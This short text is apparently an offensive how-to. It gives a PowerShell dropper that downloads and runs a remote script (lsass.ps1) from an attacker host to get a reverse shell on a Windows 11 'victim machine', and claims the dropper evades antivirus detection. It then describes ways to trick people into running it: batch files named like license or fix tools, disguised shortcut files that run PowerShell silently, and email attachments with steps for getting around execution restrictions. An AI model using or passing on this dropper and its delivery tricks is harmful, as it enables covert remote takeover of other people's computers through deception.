By runnning the following dropper on the Windows 11 victim machine you can obtain a reverse shell that remains undetected (25/14/6)!


$wc = New-Object System.Net.WebClient

$code = $wc.DownloadString("http://10.0.0.21/lsass.ps1")

Invoke-Expression $code 

Note - update the web address in the $code variable, and in the script itself. 

Here are a few ways you can have someone run the dropper:

Batch File Wrapper

Wrap the PowerShell dropper in a .bat file and name it something like OpenMe.bat, ActivateLicense.bat, or FixErrors.bat.

Rename as a Shortcut File (.lnk)

Use a shortcut icon that looks like a folder or document, but the shortcut runs PowerShell silently.

Email Attachment or Link



Provide instructions like "Right click the file and choose 'Run with PowerShell'" to bypass .ps1 execution restrictions.
